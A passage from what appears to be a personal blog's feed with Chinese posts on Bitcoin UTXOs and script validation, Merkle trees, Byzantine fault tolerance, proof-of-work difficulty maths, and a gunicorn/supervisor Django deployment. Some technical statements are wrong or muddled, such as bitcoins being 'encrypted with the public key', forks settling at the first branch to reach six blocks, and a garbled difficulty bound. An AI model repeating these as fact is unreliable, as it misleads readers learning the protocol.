比特币交易细节</h1><p>从上面的交易流程中我们可以看到比特币账本可以被认为是一个状态转换系统，这个系统中包含所有现存比特币的所有权状态和“状态转换函数”。状态转换函数以当前状态和交易为输入，输出新的状态。但是这个状态和一般的状态还有所不同，<strong>比特币系统的状态是所有已经被挖出的、没有花费的比特币集合</strong>。要理解这个概念，就不得不说UTXO。</p><hr><h2 id="未花费的交易输出——UTXO"><a href="#未花费的交易输出——UTXO" class="headerlink" title="未花费的交易输出——UTXO"></a>未花费的交易输出——UTXO</h2><p>如前文所说，比特币的交易都是基于UTXO的，即交易的输入是之前交易为花费的输出，这笔交易的输出可以被当做下一笔交易的输入。为什么要引入这样的关系呢？因为比特币是基于去中心化的应用，而去中心化的特征致使比特币没有余额的概念，只能将交易账单分散到区块链中的UTXO。UTXO是交易的基本单元，不能分割。</p><p>下面用一张盗来的图来说明比特币从一个地址被移动到另一个地址所形成的一条所有链：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15292892091142.jpg" alt=""></p><hr><p>了解了UTXO后，我们可以发现每个UTXO都有一个面值和所有者。在交易过程中一个交易包括一个或多个输入和一个或多个输出。每个输入包含一个对现有UTXO的引用和由与所有者地址相对应的私钥创建的密码学签名。每个输出包含一个新的加入到状态中的UTXO。</p><p>那么验证一笔交易的具体流程是什么呢？这需要引入介绍比特币交易的两个脚本：</p><hr><h2 id="验证一笔交易——P2PKH——比特币交易脚本"><a href="#验证一笔交易——P2PKH——比特币交易脚本" class="headerlink" title="验证一笔交易——P2PKH——比特币交易脚本"></a>验证一笔交易——P2PKH——比特币交易脚本</h2><p>P2PKH全名是（Pay-to-Public-Key-Hash）主要是用于完成比特币交易的一个常见的脚本，其主要由两个脚本构成：</p><ul><li>Signature script——解锁UTXO脚本，用于解锁UTXO，同时在交易流程中也称作交易输入。</li><li>PubKey script——锁定脚本，这个脚本是交易输出所指向的一个迪奥本，主要用于验证谁的签名能匹配交易输出地址，比特币就转给谁</li></ul><p>每一个比特币节点会同时执行解锁和锁定脚本（锁定脚本是上一个交易的锁定脚本，这样可以确认输入的来源，即上一笔交易输出作为下一笔交易的输入）来验证一笔交易，如果脚本组合结果为真，则交易有效。</p><blockquote><p>当解锁脚本与锁定脚本的设定条件相匹配时，执行组合有效脚本时才会显示结果为真。</p></blockquote><p>P2PKH模型如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15292909162189.jpg" alt=""></p><p>这里我们需要记住这几个指令，在交易验证过程中会提及。</p><hr><p>交易脚本验证的过程其实就是基于栈的执行语言，我在学习是看到一个讲的非常清楚的调用栈的图，这边就引用过来了：</p><p>首先是解锁脚本的运行过程，也就是入栈的过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15292910897406.jpg" alt=""></p><p>锁定脚本的运行过程，也就是出栈的过程：；</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15292911586251.jpg" alt=""></p><p>如果最后结果为真，说明交易有效。</p><h1 id="0x02-区块链如何解决数据量过大的问题"><a href="#0x02-区块链如何解决数据量过大的问题" class="headerlink" title="0x02 区块链如何解决数据量过大的问题"></a>0x02 区块链如何解决数据量过大的问题</h1><p>我们来思考这样一个问题：</p><p>比如A用户在某一时间与B用户产生了比特币的交易，交易记录会被矿工所接受并存储在当时对应的区块中。但是之后很长一段时间，假如未来的1年内，B都没有再次进行交易，那么B如何得知自己的钱包中还有多少比特币呢？</p><p>我们知道在区块链系统中，尤其是在使用UTXO方式存储交易的区块链系统中，每一个区块保存的都是交易的过程。如果一个账户一直没有交易，它则不会出现在最新的区块中。所以就造成了如上的问题——当前区块没有B一年前的交易信息，那么B如何能得知自己的比特币钱包中的比特币数量呢？</p><p>如果按照传统数据库删除历史数据的方式，只要一个区块中有一个交易一直没有后续交易（即没有人使用这个交易的输出账户），为了维护整个区块链系统的密码学完整性和安全性，这个区块就必须被保留，同时这个区块之后的所有区块也必须被保留。这样数据会不停的增长，当数据量过大时，处理数据就会非常的慢。所以这个问题最后就是<strong>区块链如何解决数据量过大的问题</strong>。</p><p>区块链解决这个问题的方法，就是<strong>默克尔树算法（Merkle）</strong>。</p><p>接下来我盗图来说明：</p><p>在区块链系统中，区块的结构如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15293049687731.jpg" alt=""></p><p>区块体包括当前区块经过验证的、 区块创建过程中生成的所有交易记录。这些记录通过Merkle树的哈希过程生成唯一的Merkle根并记入区块头。</p><p>默克尔树是一种二叉树，由一组叶节点、一组中间节点和一个根节点构成。最下面的大量的叶节点包含基础数据，每个中间节点是它的两个子节点的哈希，根节点也是由它的两个子节点的哈希，代表了默克尔树的顶部。默克尔树的目的是允许区块的数据可以零散地传送：节点可以从一个源下载区块头，从另外的源下载与其有关的树的其它部分，而依然能够确认所有的数据都是正确的。之所以如此是因为哈希向上的扩散：如果一个恶意用户尝试在树的下部加入一个伪造的交易，所引起的改动将导致树的上层节点的改动，以及更上层节点的改动，最终导致根节点的改动以及区块哈希的改动，这样协议就会将其记录为一个完全不同的区块（几乎可以肯定是带着不正确的工作量证明的）。</p><p>默克尔树算法并不是直接计算整个字符串的哈希值，而是每个交易都计算一个哈希值，然后两两连接再次计算哈希值，一直到最顶层的Merkle根。</p><p>也就是默克尔树完成了将一个区块转换为一串哈希值的过程。这样每个交易的区块都可以单独删除，只需要保留交易的哈希值就行。</p><p>通过这样的方法就可以完美的解决数据量过大的问题。</p><h1 id="0x03-区块链如何多点进行哈希验证？"><a href="#0x03-区块链如何多点进行哈希验证？" class="headerlink" title="0x03 区块链如何多点进行哈希验证？"></a>0x03 区块链如何多点进行哈希验证？</h1><p>现在复杂度提高一点，在P2P网络中下载时，会把大文件切成小文件，同时从多个机器上下载数据，这个时候怎么验证数据呢？</p><p>以BT下载为例，在下载真正的数据之前，我们会先下载一个哈希列表的（每个下小块计算出一个哈希），如果有一个小块数据在传输过程中损坏了，那我只要重新下载这一个数据块就行了，这时有一个问题就出现了，那么多的哈希，怎么保证它们本身(哈希列表中的哈希值)都是正确地呢？</p><p>答案是把每个小块数据的哈希值拼到一起，然后对这个长字符串在作一次哈希运算，得到哈希列表的根哈希。只要根哈希校对比一样就说明验哈希列表是正确的，再通过哈希列表校验小数据块，如果所有的小数据块验证通过则说明大文件没有被损坏。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇重点不放在科普比特币上，重点放在比特币交易的整个生命周期上。&lt;/p&gt;
&lt;p&gt;比特币是基于分布式网络的数字货币，当然也可以说是基于区块链网络的数字货币。比特币的核心是基于&lt;strong&gt;非对称加密&lt;/strong&gt;来的，&lt;strong&gt;非对称加密保证了支付的可靠性&lt;/strong&gt;。而比特币钱包其实就是你的&lt;strong&gt;公私钥对&lt;/strong&gt;，交易时你只需要把钱包地址交给别人即可，别人用你的公钥加密比特币，发送到你的地址就完成了交易，而你的钱包地址是由你自己的私钥证明的，所以你丢了私钥，就丢掉了你的钱包。&lt;/p&gt;
    
    </summary>
    
      <category term="blockchain" scheme="https://lucifaer.com/categories/blockchain/"/>
    
    
      <category term="blockchain" scheme="https://lucifaer.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>区块链补充</title>
    <link href="https://lucifaer.com/2018/06/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A1%A5%E5%85%85/"/>
    <id>https://lucifaer.com/2018/06/18/区块链补充/</id>
    <published>2018-06-18T09:03:44.000Z</published>
    <updated>2018-11-29T09:29:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="区块链补充"><a href="#区块链补充" class="headerlink" title="区块链补充"></a>区块链补充</h1><p>在完成区块链基础的笔记后，我认真地读了一遍以太坊白皮书，感觉有很多问题是之前那篇文章没有说清楚的，需要自己再好好的补充学习一下，这篇笔记就是对之前笔记的补充。</p><a id="more"></a><h1 id="0x00-去中心化需要面对的核心问题——拜占庭将军问题"><a href="#0x00-去中心化需要面对的核心问题——拜占庭将军问题" class="headerlink" title="0x00 去中心化需要面对的核心问题——拜占庭将军问题"></a>0x00 去中心化需要面对的核心问题——拜占庭将军问题</h1><h2 id="1-拜占庭将军问题"><a href="#1-拜占庭将军问题" class="headerlink" title="1. 拜占庭将军问题"></a>1. 拜占庭将军问题</h2><p>在了解了一些区块链基础后，经常会看到某某区块链利用某某算法解决了拜占庭问题，所以理解拜占庭问题是了解为什么区块链是去中心化的关键。</p><p>拜占庭将军问题（拜占庭容错）是莱斯利·兰波特用来为描述<strong>分布式系统一致性问题</strong>在论文中抽象出来的一个著名的例子。</p><p>这个例子挺好玩的，我在他的描述上把数字量化了，方便理解：</p><blockquote><p>一组拜占庭将军分别各率领一支军队共同围困一座城市。为了简化问题，将各支军队的行动策略限定为进攻或撤离两种。因为部分军队进攻部分军队撤离可能会造成灾难性后果，因此各位将军必须通过投票来达成一致策略，即所有军队一起进攻或所有军队一起撤离。因为各位将军分处城市不同方向，他们只能通过信使互相联系。在投票过程中每位将军都将自己投票给进攻还是撤退的信息通过信使分别通知其他所有将军，这样一来每位将军根据自己的投票和其他所有将军送来的信息就可以知道共同的投票结果而决定行动策略。</p></blockquote><p>在这个问题中，我们不讨论信使无法传达信息的情况。我们现在来分析一下这个问题可能出现的情况：</p><p>假设有9位将军投票，其中1名叛徒。8名忠诚的将军中出现了4人进攻，4人撤退的情况。这个时候叛徒可能就故意的给4名投进攻的将领送信表示投票进攻，而给4名投撤离的将领送信表示投撤离，这样无论从进攻方还是从撤离方来看，他们都是占有人数多的优势的，这样就造成了这一组军队的协同性遭到破坏。</p><p>假设那些忠诚的将军们仍能通过多数决定来决定他们的战略，这样就叫做达成了拜占庭容错。</p><p>我们可以看到传统的加解密是无法解决这样的问题的，因为这个问题的关键不是信息泄露，而是存在一个信息来源是否可信的问题。</p><p>解决这个问题的最好方法就是利用无法消去的数字签名来进行认证。利用数字签名固然可以找到那些“叛徒”，但是相比于消耗资源更小的错误检测（日志审计系统）系统来说，有些小题大做，比较消耗资源。而错误检测系统也会因为其覆盖错误率不全的问题而出现拜占庭问题。</p><p>莱斯利·兰波特的解决方案是<code>Paxos</code>算法或其衍生算法，简单来说就是建立一个绝对可信任的中心，收集各个节点的消息，并将准确的消息再同步到各个节点上。而这样的做法是只适用于中心化的分布式系统的。并不适合区块链的去中心化思想。</p><p>中本聪利用了一种巧妙的方式，解决了去中心化的拜占庭将军问题。</p><h2 id="2-去中心化的解决方法——工作量证明算法（POW）"><a href="#2-去中心化的解决方法——工作量证明算法（POW）" class="headerlink" title="2. 去中心化的解决方法——工作量证明算法（POW）"></a>2. 去中心化的解决方法——工作量证明算法（POW）</h2><p>POW利用工作量证明增加了发送消息的成本，降低节点发送消息的频率，这样就可以保证在一个时间段内只有一个节点（或者很少的节点）在进行广播，同时在广播时附带自己的签名。</p><p>这样就相当于减少了在整个分布式网络中其他节点的噪声，只需要让其他节点选择接受或不接受即可，诚实的节点自然会选择接受。你也可以理解为能者为大。</p><p>以上就是区块链网络中单个区块达成共识的方法（取得一致性）。</p><p>同时也可以用这个例子来解释区块链的最长链选择问题：假设这座城市需要攻打多次，那么每次发出攻击提议的人员必须是之前取得最多次胜利的人提出，也就是做的工作最多的人来完成。</p><h2 id="3-总结一下"><a href="#3-总结一下" class="headerlink" title="3. 总结一下"></a>3. 总结一下</h2><p>中本聪将一个非常简单的基于节点的去中心化共识协议与工作量证明机制结合在一起。节点通过工作量证明机制获得参与到系统的权利，每十分钟将交易打包到“区块”中，从而创建出不断增长的区块链。拥有大量算力的节点有更大的影响力，但获得比整个网络更多的算力比创建一百万个节点困难得多。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;区块链补充&quot;&gt;&lt;a href=&quot;#区块链补充&quot; class=&quot;headerlink&quot; title=&quot;区块链补充&quot;&gt;&lt;/a&gt;区块链补充&lt;/h1&gt;&lt;p&gt;在完成区块链基础的笔记后，我认真地读了一遍以太坊白皮书，感觉有很多问题是之前那篇文章没有说清楚的，需要自己再好好的补充学习一下，这篇笔记就是对之前笔记的补充。&lt;/p&gt;
    
    </summary>
    
      <category term="blockchain" scheme="https://lucifaer.com/categories/blockchain/"/>
    
    
      <category term="blockchain" scheme="https://lucifaer.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>区块链基础概念</title>
    <link href="https://lucifaer.com/2018/06/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/"/>
    <id>https://lucifaer.com/2018/06/18/区块链基础概念/</id>
    <published>2018-06-18T08:56:44.000Z</published>
    <updated>2018-11-29T09:30:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-什么是区块链"><a href="#0x00-什么是区块链" class="headerlink" title="0x00 什么是区块链"></a>0x00 什么是区块链</h1><p>简单一句话就可以回答：<strong>区块链是一种特殊的分布式数据库</strong>。</p><a id="more"></a><p>想要理解上面的叙述，你需要理解下面两个概念：</p><ul><li>分布式系统</li><li>去中心化</li></ul><p>分布式系统我就不多说了，想必大家都清楚。那么我们重点来说一下去中心化。</p><blockquote><p>去中心化，简单来说，<strong>去中心化不是没有中心，而是在一个分布有众多节点的系统中，每个节点都可以成为一个中心，而且每个中心都不是永久的，都是阶段性的</strong>。</p></blockquote><p>这意味着在整个分布式系统中各个节点的地位都是平等的。而去中心化和区块链的关系可以这么理解：<strong>区块链是去中心化的一种实现工具或者说是实现方法</strong>。</p><p>首先，区块链的作用是用来储存分布式网络（区块链网络）中的信息。在区块链网络中任何需要存储的信息都可以写入区块链，同时在区块链网络中任一节点也可以从区块链中读取相应的信息，<strong>所以说它就是一个分布式数据库</strong>。</p><p>其次，任何人都可以加入这个区块链网络中，并成为其中的一个节点。在区块链网络中，没有中心节点，每一个节点都是平等的，都保存着完整的区款链（数据库）。也就是说在任一节点对区块链进行读写操作最后都会同步到整个区块链网络上。</p><h1 id="0x01-区块链特点"><a href="#0x01-区块链特点" class="headerlink" title="0x01 区块链特点"></a>0x01 区块链特点</h1><p>经过上面的介绍，可能会觉得区块链和分布式数据库没有什么差别。实际上区块链是改进了分布式数据库的一个新产品吧。</p><p>区块链最具特点的地方在：<strong>区块链作为一个分布式数据库，是没有管理员的，也就是去中心化的</strong>。去中心化的思路使区块链是无法被审计的，同时也不会受到某些处于中心位置的管理员对其进行管理。所以区块链是无法被控制的。</p><p>这样的特点其实也造成了一些云玩家天天叫喊着“我们为了隐私，要去中心化”的儿戏之言。就像你觉得FaceBook要求用户上传他们的隐私，以此来防止用户隐私泄露的方法很蠢一样，为了隐私而去中心化，其实和FaceBook的做法差不多。</p><h1 id="0x02-区块链的组成——区块"><a href="#0x02-区块链的组成——区块" class="headerlink" title="0x02 区块链的组成——区块"></a>0x02 区块链的组成——区块</h1><p>区块链由一个个区块组成。每一个区块也可以称为数据库的记录。区块的构造有点像内存的结构，包含两个部分：</p><ul><li>区块头（Head）：记录当前区块的特征值</li><li>区块体（Body）：实际数据</li></ul><p>区块头包含着当前区块的多项特征，下图是区块头的示意图：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15290758238724.jpg" alt=""></p><p>其中比较重要的几个特征为：</p><ul><li>hashPrevBlock（上一个区块的哈希）</li><li>Target（难度目标）：该区块工作量证明算法的难度目标，后面会提到</li><li>Nonce</li></ul><p>我们都知道如果原始内容不同，其对应的哈希一定是不同的，哈希保证了数据的唯一性。因此：</p><ul><li>可以通过哈希来表示不同的区块</li><li>如果区块的内容改变了，其哈希一定会改变</li></ul><p>也就是说：</p><blockquote><p>在区块链中，如果当前区块的内容改变了，或者上一个区块的哈希变了，一定会引起当前区块的哈希改变。</p></blockquote><p>这一点对于区块链来说意义重大。如果有人改变了一个区块的内容，这个区块的哈希就会改变。为了让后面的区块还能连接到它（Head中所记录的上一个区块的哈希值），他需要一次改变后面的所有区块，否则后面的区块就会脱离该区块链。而哈希破解本身就需要相当大的算力，所以短时间更改多个区块基本上是不可能发生的。</p><p>这样就保证了区块链中的每一个区块是很难被更改的。防止数据被篡改。</p><h1 id="0x03-区块的产生——挖矿"><a href="#0x03-区块的产生——挖矿" class="headerlink" title="0x03 区块的产生——挖矿"></a>0x03 区块的产生——挖矿</h1><p>在了解了区块本身的结构后，我们来说一说区块是如何生成的。经过上面的介绍，我们知道区块链本身就是一个数据库，用于记录一些信息，而生成这个数据库从而产生新区块的过程就是挖矿。</p><p>由于区块链网络本身是一个分布式的数据库，其必定存在节点更新的工作，为了保证所有节点可以同步的更新数据，新区块的添加速度必定不能太快，因为过快的增加区块会影响其他同步较慢节点区块的生成。</p><p>中本聪在设计区块链时也考虑到了这个情况，他在设计比特币系统的时候设计了每10分钟产生一个新的区块，在生成区块的算法上，他使用了POW算法的思路，这个算法就是我们常说的<strong>工作量证明算法</strong>，这个算法简单来说就是为了防止资源滥用，在每个节点生成新区块前，首先需要做一定量的工作，生成工作量证明，确保节点的正常。</p><p>在前面我们已经介绍过了区块头的结构，在区块头结构中有一个Nonce字段，这个字段是也就是工作量证明算法需要做的工作。在其他字段值不变的情况下，通过不断的更新Nonce的值来改变区块头这个结构的整体哈希值。</p><p>如何证明该节点的工作是有效的呢？在区块头结构中还有一个Target值，只有当你找到一个Nonce值使得整个结构算出的哈希值小于Target值，才算成功，才能生成新的区块。</p><h1 id="0x04-为什么说挖矿很难"><a href="#0x04-为什么说挖矿很难" class="headerlink" title="0x04 为什么说挖矿很难"></a>0x04 为什么说挖矿很难</h1><p>根据以上的介绍，可以将挖矿理解为计算Nonce值，使得当前区块头的哈希值小于Target值。这个哈希值需要进行相当复杂的计算，接下来就深入聊一下为什么说挖矿很难。</p><h2 id="1-难度系数"><a href="#1-难度系数" class="headerlink" title="1. 难度系数"></a>1. 难度系数</h2><p><strong>难度系数（difficulty）是指与上一次发现一个区块时相比，现在发现一个区块的困难程度。</strong></p><p>在区块头中都会包含一个难度系数（difficulty），这个值决定了计算哈希的难度。难度系数在区块中并不记录，而是一个浮点数，其公式如下：</p><p>$$difficulty=\cfrac{difficulty_1_target}{currentTarget}$$</p><p><code>difficulty_1_target</code>是一个非常大的常数。表示矿池挖矿最大难度，其数值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000FFFF0000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>也就是：</p><p>$$diffuculty_1_taget=0xffff*2^{208}$$</p><p>难度系数是如何存储在区块中的呢？每个区块会被存储为一个经过压缩后的target，target是使用十六进制表示的。这个target是能够使用预定义的公式推断的，用一个具体的例子来说明过程。</p><p>如果区块bits记录为<code>0x1b0404cb</code>，在计算时，后面3个字节<code>0x0404cb</code>为底，前面的1字节<code>0x1b</code>表示次方数，因此这个16进制的target是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0404cb * 2 ** (8*(0x1b-3)) = 0x00000000000404CB000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>我们来理一下压缩的过程：</p><ol><li>将数字转换为256进制数</li><li>如果第一位数字大于127即（0x7f），则在前面添加0</li><li>压缩结果中的第一位存放该256进制数的位数</li><li>后面三个数存放该256进制数的前三位，如果不足三位，则在后面补0</li></ol><p>举个例子，如果将1000压缩，先转换成256进制数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1000=0x03 * 256 + 0xe8 * 1</span><br></pre></td></tr></table></figure><p>由两个数字构成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03      e8</span><br></pre></td></tr></table></figure><p><code>03</code>未超过0x7f，前面不需要添0，但是长度为两位低于三位，需要在后面补0，最终表示为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0203e800</span><br></pre></td></tr></table></figure><p>根据公式可以看到当<code>current_target=0</code>时<code>diffculty</code>无穷大，但是实际情况是最大难度值接近$2^{265-32}$，同理难度值的最小值为1。</p><h2 id="2-难度系数的动态调节"><a href="#2-难度系数的动态调节" class="headerlink" title="2. 难度系数的动态调节"></a>2. 难度系数的动态调节</h2><p>中本聪在设计区块链时规定了每10分钟生成一个新的区块，并且每2016个区块(每2周<code>6*24*7*2=2016</code>)动态更新一次难度系数。如果生成前面的2016个区块花费了超过2周的时间，难度会根据比例来降低难度系数，同理，如果少于2周时间，则会根据比例上调难度系数。</p><p>难度系数越调越高，根据难度计算公式，我们能知道目标值会越来越小，所以挖矿越来越难。</p><h2 id="3-网络算力（hash-rate）和给定难度的相关性"><a href="#3-网络算力（hash-rate）和给定难度的相关性" class="headerlink" title="3. 网络算力（hash rate）和给定难度的相关性"></a>3. 网络算力（hash rate）和给定难度的相关性</h2><p>网络算力，表示根据难度值要计算多少次才能找到一个随机数使得区块哈希值低于目标值。由当前目标值<code>currentTarget</code>决定当前难度值。假设当前难度为D（十进制），根据难度公式得到难度D的偏移为：</p><p>$$currentTarget=\cfrac{difficulty_1_target}{D}=\cfrac{0xffff*2^{208}}{D}$$</p><p>我们都知道区块计算出的哈希值是一个256bit的值，也就是说在难度D下，如果想要生成新的区块，大约要计算的哈希个数为：</p><p>$$\cfrac{D}{0xffff<em>2^{208}}</em>2^{256}=\cfrac{D<em>2^{48}}{0xffff}=D</em>2^{32}$$</p><p>也就是目前难度计算速度要求在10分钟内找到，也就是说网络算力最低必须是：</p><p>$$\cfrac{D*2^{32}}{600}$$</p><p>简单来算的话，当难度值D=1，需要每秒计算7158278次哈希，即7.15 Mhahs/s。</p><h2 id="4-如何估算产生一个块的时间"><a href="#4-如何估算产生一个块的时间" class="headerlink" title="4. 如何估算产生一个块的时间"></a>4. 如何估算产生一个块的时间</h2><p>下面的公式可以计算产生一个块的平均值：</p><p>$$time=\cfrac{difficulty * 2^{32}}{hashrate}$$</p><p><code>difficulty</code>是当前难度，<code>hashrate</code>是每秒矿机计算的哈希个数（算力），<code>time</code>是挖掘到新区块的平均间隔时间。</p><p>附一个算力换算公式：</p><ul><li>1 KHash/s = 1000 Hash/s</li><li>1 MHash/s = 1000 KHash/s</li><li>1 GHash/s = 1000 MHash/s</li><li>1 THash/s = 1000 GHash/s</li><li>1 PHash/s = 1000 THash/s</li></ul><p>了解一下现在的难度：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15289631860281.jpg" alt=""></p><p>普通计算机（i7 6700k + 16g内存）算力差不多是1.8GH/s，我按2GH/s来算：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15290792625540.jpg" alt=""></p><p>差不多是要122784365天。</p><h1 id="0x05-区块链的分叉"><a href="#0x05-区块链的分叉" class="headerlink" title="0x05 区块链的分叉"></a>0x05 区块链的分叉</h1><p>在区块链中可能出现同时有两个区块加入，而且其都是连接着前一个区块的新区块，这样就可能形成分叉，这个时候区块链会记录各个分叉的情况，看哪个分叉后面首先达到6个新区块，就将哪个分叉并入区块链中，并将其他的分叉抛弃。</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>区块链作为去中心化的工具是一个非常新颖的领域，同时其所存储的数据是较为可靠的，但是它比较消耗能源，并且效率低下，所以区块链目前适用的场景非常有限。目前最大的应用场景就是虚拟货币。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-什么是区块链&quot;&gt;&lt;a href=&quot;#0x00-什么是区块链&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是区块链&quot;&gt;&lt;/a&gt;0x00 什么是区块链&lt;/h1&gt;&lt;p&gt;简单一句话就可以回答：&lt;strong&gt;区块链是一种特殊的分布式数据库&lt;/strong&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="blockchain" scheme="https://lucifaer.com/categories/blockchain/"/>
    
    
      <category term="blockchain" scheme="https://lucifaer.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>部署Django</title>
    <link href="https://lucifaer.com/2018/03/02/%E9%83%A8%E7%BD%B2Django/"/>
    <id>https://lucifaer.com/2018/03/02/部署Django/</id>
    <published>2018-03-02T09:44:44.000Z</published>
    <updated>2018-11-29T09:27:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>接上一篇。</p><a id="more"></a><p>这边说一句，git hooks配合supervisor可以完成远程代码实时更新，对于开发人员来说是非常方便的开发环境。当然对于我的wiki来说，我会随时添加一些新的功能，需要频繁的修改代码，git hooks+supervisor可以完美的符合我的需求。</p><h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>在官方文档中搜索<code>deploy</code>官方文档会告诉你，Django私有的部署平台是<code>WSGI</code>，而官方对于<code>WSGI</code>服务的部署给出了以下几个方法，我们这次试用的是<code>gunicorn</code>。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15199632384352.jpg" alt=""></p><h1 id="0x01-Get-Start"><a href="#0x01-Get-Start" class="headerlink" title="0x01 Get Start"></a>0x01 Get Start</h1><p>首先安装<code>gunicorn</code>包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gunicorn</span><br></pre></td></tr></table></figure><p>接下来检查是否存在<code>&lt;project_name&gt;/wsgi.py</code>文件（如果试用命令<code>startproject</code>来创建的项目，会默认存在）。若存在，就可以在项目根目录来执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunicorn myproject.wsgi</span><br></pre></td></tr></table></figure><p>访问<code>127.0.0.1:8000</code>来查看服务是否正常，如果没问题，我们来写个shell脚本，方便我们利用<code>gunicorn</code>来启动服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">NAME=&quot;D0g3_wiki&quot;                                  # Name of the application</span><br><span class="line">DJANGODIR=/home/lucifaer/D0g3_wiki             # Django project directory</span><br><span class="line">SOCKFILE=/home/lucifaer/D0g3_wiki/run/gunicorn.sock  # we will communicte using this unix socket</span><br><span class="line">USER=lucifaer                                     # the user to run as</span><br><span class="line">GROUP=lucifaer                                 # the group to run as</span><br><span class="line">NUM_WORKERS=3                                     # how many worker processes should Gunicorn spawn</span><br><span class="line">DJANGO_SETTINGS_MODULE=D0g3_wiki.settings             # which settings file should Django use</span><br><span class="line">DJANGO_WSGI_MODULE=D0g3_wiki.wsgi                     # WSGI module name</span><br><span class="line"></span><br><span class="line">echo &quot;Starting $NAME as `whoami`&quot;</span><br><span class="line"></span><br><span class="line"># Activate the virtual environment</span><br><span class="line">cd $DJANGODIR</span><br><span class="line">export DJANGO_SETTINGS_MODULE=$DJANGO_SETTINGS_MODULE</span><br><span class="line">export PYTHONPATH=$DJANGODIR:$PYTHONPATH</span><br><span class="line">export PATH=/srv/http/.gem/ruby/2.4.0/bin:$PATH</span><br><span class="line"># Create the run directory if it doesn&apos;t exist</span><br><span class="line">RUNDIR=$(dirname $SOCKFILE)</span><br><span class="line">test -d $RUNDIR || mkdir -p $RUNDIR</span><br><span class="line"></span><br><span class="line"># Start your Django Unicorn</span><br><span class="line"># Programs meant to be run under supervisor should not daemonize themselves (do not use --daemon)</span><br><span class="line">exec /home/lucifaer/.pyenv/versions/3.6.3/bin/gunicorn -b 0.0.0.0:8000 $&#123;DJANGO_WSGI_MODULE&#125;:application \</span><br><span class="line">  --name $NAME \</span><br><span class="line">  --workers $NUM_WORKERS \</span><br><span class="line">  --user=$USER --group=$GROUP \</span><br><span class="line">#  --bind=unix:$SOCKFILE \</span><br><span class="line">  --log-level=debug \</span><br><span class="line">  --reload \</span><br><span class="line">  --log-file=-</span><br></pre></td></tr></table></figure><p>PS：这是我的配置文件，请根据自己的目录修改变量。</p><p>之后更改该文件的权限为可执行。</p><p>最后一步就是把我们Django项目中的settings.py做如下更改：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15199763187343.jpg" alt=""></p><p>即关闭debug模式，并允许所有的host访问。</p><p>以上就完成了最基本的Django的部署，接下来我们要设置supervisor，来将这个进程设置为守护进程。</p><h1 id="0x02-Supervisor"><a href="#0x02-Supervisor" class="headerlink" title="0x02 Supervisor"></a>0x02 Supervisor</h1><p>Superviosr是一个进程监管的工具。简而言之，Superviosr可以保证你的程序在服务器开机时自动启动以及程序意外终止时重新启动。通过下面的命令即可安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install supervisor</span><br></pre></td></tr></table></figure><p>接下来就是配置Supervisor的配置文件，以达成监管目的。一般配置文件都放在<code>/etc/supervisor/conf.d</code>目录下。我们可以在该目录下创建自定义的配置文件，下面是我的配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 